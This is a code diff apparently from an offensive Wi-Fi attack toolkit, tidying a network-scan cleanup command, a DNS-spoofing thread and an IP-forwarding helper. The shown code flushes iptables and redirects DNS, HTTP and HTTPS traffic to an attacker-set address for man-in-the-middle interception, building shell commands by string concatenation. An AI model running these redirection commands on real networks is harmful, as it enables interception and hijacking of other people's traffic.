@@ -67,7 +67,7 @@ def get_network_scan():
                 channel = network.find('channel').text
                 bssid = network.find('bssid').text
                 list_scan.append(channel + "||" + essid + "||" + bssid)
-        popen("rm Settings/Dump/networkdump-01.*")
+        popen("rm Settings/Dump/networkdump*")
         return list_scan
     except IOError:
         return None
@@ -230,17 +230,13 @@ class ThDnsSpoofAttack(QThread):
     def redirection(self):
         system("iptables --flush")
         system("iptables --zero")
-
         system("iptables --delete-chain")
         system("iptables -F -t nat")
-
         system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
         system("iptables --append FORWARD --in-interface "+self.interface+" --jump ACCEPT")
-
         system("iptables --table nat --append POSTROUTING --out-interface "+self.interface+" --jump MASQUERADE")
         system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination "+self.redirect)
         system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination "+self.redirect)
-
         system("iptables -t nat -A PREROUTING -i "+self.interface+" -p udp --dport 53 -j DNAT --to "+self.redirect)
         system("iptables -t nat -A PREROUTING -i "+self.interface+" -p tcp --dport 53 -j DNAT --to "+self.redirect)
 
@@ -320,6 +316,11 @@ class Refactor:
         HTML += '</span></pre>\n'+'</body>\n'+'</html>\n'
         return HTML
 
+    @staticmethod
+    def set_ip_forward(value):
+        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:
+            file.write(str(value))
+            file.close()
     '''
     http://stackoverflow.com/questions/159137/getting-mac-address
     '''
